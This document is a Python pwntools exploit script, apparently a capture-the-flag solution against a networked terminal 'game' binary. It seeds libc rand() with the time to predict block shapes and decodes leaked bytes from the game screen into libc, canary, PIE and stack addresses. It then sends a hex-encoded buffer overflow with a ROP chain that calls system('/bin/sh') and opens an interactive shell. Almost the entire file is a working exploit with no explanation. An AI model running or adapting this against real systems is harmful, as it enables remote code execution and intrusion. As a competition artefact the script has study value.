#!/usr/bin/python
import ctypes, sys, os

os.environ["PWNLIB_NOTERM"] = "1"
os.environ["term"] = "xterm-256color"

from pwn import *
import pyte, binascii

warnings.simplefilter("ignore")
HOST = "35.194.113.63"
PORT = 10004
PROCESS = "./game"

GAME_SCREEN = []

f = open("log_output", "w")

ctypes.cdll.LoadLibrary("libc.so.6")
lc = ctypes.CDLL("libc.so.6")

# calculated leaks
LEAKS = [
    [0x60, 0, 0, 0, 0, 0x7F, 0x0, 0],   # SYSTEM
    [0, 0, 0, 0, 0, 0, 0, 0],           # CANARY
    [0, 0, 0, 0, 0, 0, 0, 0],           # RBP
    [0, 0, 0, 0, 0, 0, 0, 0],           # PIE1
    [0, 0, 0, 0, 0, 0, 0, 0],           # STACK
    [0, 0, 0, 0, 0, 0, 0, 0],           # PIE2
]

# mapping block bytes to leaked byte position
LEAK_MAP = [
    [6, 7, 3, 4],
    [2, 3, 4, 5],
    [5, 0, 1, 2],
    [3, 0, 1, 2],
    [4, 0, 1, 2],
    [0, 4, 5, 1],
    [6, 3, 4, 1]
]

SHAPES = []
BLEAKS = []
SHAPE_IDX = -1
BLEAK_IDX = -1

SYSTEM_LEAK_FINISHED = False
GAME_FINISHED = False
SCORE = 0

def log(msg):
    f.write(msg + "\n")
    f.flush()

def parse_game_thread():
    global GAME_SCREEN, GAME_FINISHED

    screen = pyte.Screen(100, 500)
    stream = pyte.ByteStream(screen)

    while not GAME_FINISHED:
        b = r.recv()
        print(b.decode("utf-8"))
        stream.feed(b)
        GAME_SCREEN = []
        for disp in screen.display[5:35]:
            GAME_SCREEN.append(disp[5:])
    
    log("Parse game thread finished")

def get_difficulty(screen):
    if len(screen) >= 20:
        difficulty = re.findall("Difficulty: (.*)", screen[20])
        
        if len(difficulty) > 0:
            return int(difficulty[0].strip())
        
    return -1

def get_new_block(screen):
    cur_block = ""

    for row in screen:
        content = row[1:31].strip().replace(" ", "")

        if len(content)>0:
            cur_block += content            
        else:
            cur_block = ""

        if len(cur_block) == 2*4:
            return cur_block
        
    return ""

def parse_block(block, shape, bleak):
    global LEAKS

    log("Parse_block     : %s / %d / %d" % (block, shape, bleak))

    b = []

    for i in range(4):        
        b.append(ord(bytes.fromhex(block[i*2:(i*2)+2])))

    for i in range(4):
        LEAKS[bleak][LEAK_MAP[shape][i]] = b[i] ^ 0x41

def get_addr(leak):
    result = ""
    for v in leak:
        result += chr(v)

    return u64(result)

def debug_leaks():
    log("-------------------------------------")
    log("SYSTEM : %s" % hex(get_addr(LEAKS[0])))
    log("CANARY : %s" % hex(get_addr(LEAKS[1])))
    log("RBP    : %s" % hex(get_addr(LEAKS[2])))
    log("PIE1   : %s" % hex(get_addr(LEAKS[3])))
    log("STACK  : %s" % hex(get_addr(LEAKS[4])))
    log("PIE2   : %s" % hex(get_addr(LEAKS[5])))
    log("-------------------------------------")

def check_for_finished_system_leak():
    global LEAKS, SYSTEM_LEAK_FINISHED

    for i in range(6):
        if LEAKS[0][i] == 0:
            return
        
    log("### SYSTEM LEAK FINISHED ###")
    
    SYSTEM_LEAK_FINISHED = True

def parse_leaks():
    global GAME_SCREEN, SYSTEM_LEAK_FINISHED
    last_difficulty = 0
    search_for_new_block = False

    while not SYSTEM_LEAK_FINISHED:
        # check if difficulty has changed => new block available
        difficulty = get_difficulty(GAME_SCREEN)

        if difficulty != -1 and (difficulty != last_difficulty):
            last_difficulty = difficulty
            search_for_new_block = True            
            time.sleep(1)  # sleep to make sure, that new block is already in screen

        # parse until we found a new block on top of the screen
        if search_for_new_block:
            found_block = get_new_block(GAME_SCREEN)

            if found_block:
                log("New block found : %s" % found_block)

                search_for_new_block = False                
                parse_block(found_block, SHAPES[SHAPE_IDX], BLEAKS[BLEAK_IDX])
                pop()
                debug_leaks()         
                check_for_finished_system_leak()       

def push():
    global SHAPES, BLEAKS
    SHAPES.append(lc.rand() % 7)

def pop():
    global SHAPES, BLEAKS, SHAPE_IDX, BLEAK_IDX
    BLEAKS.append(lc.rand() % 6)

    SHAPE_IDX += 1
    BLEAK_IDX += 1
    push()

def exploit(r):
    global GAME_SCREEN, GAME_FINISHED
    
    lc.srand(lc.time(None))

    push()
    push()
    push()
    pop()

    # start game parsing thread
    parser = threading.Thread(target=parse_game_thread, args=())
    parser.start()    

    # start leak deobfuscator thread
    leaker = threading.Thread(target=parse_leaks, args=())
    leaker.start()

    # listen to input and forward to game (end game session with 'q')
    while True:
        user_inp = input()
        if user_inp == "q":
            GAME_FINISHED = True
            break
        r.send(user_inp)
    
    leaker.join()

    # should be at reward screen now
    
    # calculate libc base
    log("Send ropchain")

    libc.address = get_addr(LEAKS[0]) - libc.symbols["system"]
    log("LIBC   : %s" % hex(libc.address))
    
    # send ropchain to reward
    POPRDI = libc.address + 0x2a3e5
    RET = libc.address + 0xf872e

    ropchain = p64(POPRDI)
    ropchain += p64(next(libc.search(b"/bin/sh")))
    ropchain += p64(RET)
    ropchain += p64(libc.symbols["system"])

    payload = b"aa"*0x48                    # fill buffer
    payload += b"`"*32                      # skip canary+rbp
    payload += binascii.hexlify(ropchain)   # append ropchain

    print(payload)

    r.sendline(payload)

    r.interactive()   

    return


if __name__ == "__main__":
    # e = ELF("./game")
    libc = ELF("./libc.so.6")

    if len(sys.argv) > 1:
        LOCAL = False
        r = remote(HOST, PORT)
    else:
        LOCAL = True
        # r = process("./game", stdout=PIPE)
        r = process("./run_local.sh")
        print(util.proc.pidof(r))

    exploit(r)
